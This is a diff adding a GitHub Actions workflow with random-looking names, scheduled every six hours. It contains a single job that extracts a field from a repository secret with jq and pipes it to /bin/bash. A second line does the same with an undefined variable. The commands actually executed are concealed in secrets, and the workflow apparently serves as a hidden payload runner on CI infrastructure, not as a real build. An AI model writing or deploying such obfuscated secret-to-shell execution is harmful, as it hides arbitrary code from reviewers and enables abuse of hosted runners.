@@ -1,0 +1,18 @@
+name: haoshangshu2391
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haoshangshu2391
+        env:
+          iyc071: ${{ secrets.iyc071 }}
+        run: |
+          echo $iyc071 | jq -r .oa61 | /bin/bash
+          echo $g157 | jq -r .tejdx13 | /bin/bash
+
